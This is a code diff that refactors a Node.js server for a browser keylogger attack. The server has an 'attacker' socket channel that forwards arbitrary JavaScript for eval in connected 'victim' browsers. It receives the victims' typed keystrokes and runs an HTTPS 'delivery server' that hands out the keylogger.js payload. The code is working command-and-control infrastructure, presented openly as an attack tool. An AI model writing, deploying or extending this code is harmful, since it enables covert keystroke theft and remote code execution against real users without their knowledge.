@@ -1,35 +1,33 @@
-const express = require('express');
-const http = require('http');
-var https = require('https');
-var fs = require('fs');
-const path = require('path');
+import express from 'express';
+import http from 'http';
+import https from 'https';
+import fs from 'fs';
+import path from 'path';
+import { Server } from 'socket.io';
+
+const __dirname = path.resolve()
 
 const app = express();
-
-const { Server } = require("socket.io");
-
 const socketServer = http.createServer(app);
 const io = new Server(socketServer);
 
-app.use("/", express.static(path.join(__dirname, 'public')));
-
 const spy = io
     .of('/spy')
-    .on('connection', function (socket) {
+    .on('connection', (socket) => {
         console.log('Attacker connected.');
         socket.on('eval', function (js) {
             console.log('Remote JS:', js);
             victim.emit('eval', js);
         });
 
-        socket.on('disconnect', function () {
+        socket.on('disconnect', () => {
             console.log('Attacker disconnected.');
         });
     });
 
 const victim = io
     .of('/victim')
-    .on('connection', function (socket) {
+    .on('connection', (socket) => {
         console.log('Victim connected');
 
         socket.on('type', function (key) {
@@ -58,9 +56,10 @@ const victim = io
         });
     });
 
+app.use("/", express.static(path.join(__dirname, 'public')));
 
-var privateKey = fs.readFileSync(__dirname + '/../certs/server.key', 'utf8');
-var certificate = fs.readFileSync(__dirname + '/../certs/server.crt', 'utf8');
+var privateKey = fs.readFileSync(__dirname + '/certs/server.key', 'utf8');
+var certificate = fs.readFileSync(__dirname + '/certs/server.crt', 'utf8');
 
 var encryption = {
     key: privateKey,
@@ -68,7 +67,7 @@ var encryption = {
 };
 
 https.createServer(encryption, (req, res) => {
-    fs.readFile(__dirname + '/delivery/keylogger.js', function (err, data) {
+    fs.readFile(__dirname + '/app/utils/keylogger.js', function (err, data) {
         if (err) {
             res.writeHead(404);
             res.end(JSON.stringify(err));
@@ -78,7 +77,7 @@ https.createServer(encryption, (req, res) => {
         res.end(data);
     });
 }).listen(8443, () => {
-    console.log('Delivery server: https://0.0.0.0:8443/keylogger.js.');
+    console.log('Delivery server: https://0.0.0.0:8443');
 });
 
 socketServer.listen(3000, () => {
